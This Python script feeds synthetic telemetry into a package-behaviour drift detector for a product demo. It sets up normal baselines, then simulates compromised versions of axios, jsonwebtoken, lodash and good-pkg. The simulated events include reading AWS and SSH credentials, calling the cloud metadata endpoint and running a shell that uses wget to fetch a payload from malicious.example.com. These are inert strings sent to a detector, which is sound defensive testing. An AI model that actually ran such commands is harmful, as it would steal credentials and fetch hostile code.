#!/usr/bin/env python3
"""Inject realistic demo data into the Goodman collector for product demos."""
import json
import time
import urllib.request
import urllib.error
import sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8847"

def post(events):
    data = json.dumps({"sensor": "demo", "events": events}).encode()
    req = urllib.request.Request(
        f"{BASE}/v1/events",
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return json.loads(r.read())
    except Exception as e:
        print(f"  ERROR: {e}")
        return None

def ev(service, package, version, type_, behavior, ts_ns):
    return {
        "service": service,
        "package": package,
        "version": version,
        "type": type_,
        "behavior": behavior,
        "timestamp": ts_ns
    }

# Base time: fixed unix nanoseconds (July 2025 = realistic production timestamp)
BASE_TS = 1752956400_000_000_000  # 2025-07-20 00:00:00 UTC in nanoseconds

def ts(offset_ms):
    """offset_ms: milliseconds offset from base"""
    return BASE_TS + offset_ms * 1_000_000

print("=== Injecting baseline data ===")

# --- good-pkg@1.0.0 baseline (web service) ---
print("  good-pkg@1.0.0 baseline (web)...")
for i in range(12):
    result = post([
        ev("web", "good-pkg", "1.0.0", 1, "READ /app/node_modules/good-pkg/**", ts(i*150)),
        ev("web", "good-pkg", "1.0.0", 2, "CONNECT 10.0.0.5:5432", ts(i*150 + 5)),
    ])
    if result:
        print(f"    batch {i}: ingested={result.get('ingested')}, alerts={result.get('alerts')}")

time.sleep(0.5)

# --- axios@1.6.0 baseline (payment-api) ---
print("  axios@1.6.0 baseline (payment-api)...")
for i in range(12):
    result = post([
        ev("payment-api", "axios", "1.6.0", 2, "CONNECT api.stripe.com:443", ts(2000 + i*150)),
        ev("payment-api", "axios", "1.6.0", 1, "READ /app/node_modules/axios/**", ts(2000 + i*150 + 3)),
        ev("payment-api", "axios", "1.6.0", 2, "CONNECT api.paypal.com:443", ts(2000 + i*150 + 6)),
    ])

time.sleep(0.5)

# --- jsonwebtoken@9.0.0 baseline (auth-service) ---
print("  jsonwebtoken@9.0.0 baseline (auth-service)...")
for i in range(12):
    result = post([
        ev("auth-service", "jsonwebtoken", "9.0.0", 1, "READ /app/node_modules/jsonwebtoken/**", ts(5000 + i*150)),
        ev("auth-service", "jsonwebtoken", "9.0.0", 1, "READ /app/certs/public.pem", ts(5000 + i*150 + 4)),
    ])

time.sleep(0.5)

# --- lodash@4.17.21 baseline (api-gateway) ---
print("  lodash@4.17.21 baseline (api-gateway)...")
for i in range(10):
    result = post([
        ev("api-gateway", "lodash", "4.17.21", 1, "READ /app/node_modules/lodash/**", ts(8000 + i*150)),
    ])

# --- express@4.18.2 baseline (web) ---
print("  express@4.18.2 baseline (web)...")
for i in range(10):
    result = post([
        ev("web", "express", "4.18.2", 1, "READ /app/node_modules/express/**", ts(11000 + i*150)),
        ev("web", "express", "4.18.2", 2, "CONNECT 127.0.0.1:6379", ts(11000 + i*150 + 5)),
    ])

time.sleep(1)

print("\n=== Injecting DRIFT events ===")

# --- good-pkg@1.0.1 CRITICAL drift ---
print("  good-pkg@1.0.1 CRITICAL drift (credential read + metadata call)...")
result = post([
    ev("web", "good-pkg", "1.0.1", 1, "READ /app/node_modules/good-pkg/**", ts(9000)),
    ev("web", "good-pkg", "1.0.1", 2, "CONNECT 10.0.0.5:5432", ts(9001)),
    ev("web", "good-pkg", "1.0.1", 1, "READ /tmp/goodman-fake-secrets/credentials", ts(9002)),
    ev("web", "good-pkg", "1.0.1", 2, "CONNECT 169.254.169.254:80", ts(9003)),
])
print(f"    result: {result}")

# --- axios@1.6.5 CRITICAL drift ---
print("  axios@1.6.5 CRITICAL drift (AWS creds + suspicious IP)...")
result = post([
    ev("payment-api", "axios", "1.6.5", 2, "CONNECT api.stripe.com:443", ts(9100)),
    ev("payment-api", "axios", "1.6.5", 1, "READ /app/node_modules/axios/**", ts(9101)),
    ev("payment-api", "axios", "1.6.5", 1, "READ /root/.aws/credentials", ts(9102)),
    ev("payment-api", "axios", "1.6.5", 2, "CONNECT 45.33.32.156:443", ts(9103)),
    ev("payment-api", "axios", "1.6.5", 1, "READ /root/.ssh/id_rsa", ts(9104)),
])
print(f"    result: {result}")

# --- jsonwebtoken@9.0.2 CRITICAL drift ---
print("  jsonwebtoken@9.0.2 CRITICAL drift (shell spawn + metadata)...")
result = post([
    ev("auth-service", "jsonwebtoken", "9.0.2", 1, "READ /app/node_modules/jsonwebtoken/**", ts(9200)),
    ev("auth-service", "jsonwebtoken", "9.0.2", 3, "EXEC /bin/sh -c wget http://malicious.example.com/payload", ts(9201)),
    ev("auth-service", "jsonwebtoken", "9.0.2", 2, "CONNECT 169.254.169.254:80", ts(9202)),
    ev("auth-service", "jsonwebtoken", "9.0.2", 2, "CONNECT 192.168.100.200:4444", ts(9203)),
])
print(f"    result: {result}")

# --- lodash@4.17.22 CRITICAL drift (unexpected network connect) ---
print("  lodash@4.17.22 CRITICAL drift (unexpected network connect)...")
result = post([
    ev("api-gateway", "lodash", "4.17.22", 1, "READ /app/node_modules/lodash/**", ts(9300)),
    ev("api-gateway", "lodash", "4.17.22", 2, "CONNECT updates.lodash.io:443", ts(9301)),
])
print(f"    result: {result}")

time.sleep(1)

print("\n=== Final State ===")
try:
    with urllib.request.urlopen(f"{BASE}/v1/alerts", timeout=5) as r:
        alerts = json.loads(r.read())
    print(f"Total alerts: {len(alerts)}")
    for a in sorted(alerts, key=lambda x: x["severity"]):
        print(f"  [{a['severity']}] {a['package']}@{a.get('new_version','?')} in {a['service']} — {len(a.get('new_behaviors',[]))} new behaviors")
        for b in a.get('new_behaviors', []):
            print(f"    + {b}")
except Exception as e:
    print(f"ERROR fetching alerts: {e}")

try:
    with urllib.request.urlopen(f"{BASE}/v1/fingerprints", timeout=5) as r:
        fps = json.loads(r.read())
    print(f"\nTotal fingerprints: {len(fps)}")
    for fp in sorted(fps, key=lambda x: (x['service'], x['package'])):
        state = "BASELINE" if fp["is_baseline"] else "learning"
        print(f"  [{state}] {fp['service']}/{fp['package']}@{fp['version']} — {fp['obs_count']} obs, {len(fp.get('behaviors',{}))} behaviors")
except Exception as e:
    print(f"ERROR fetching fingerprints: {e}")
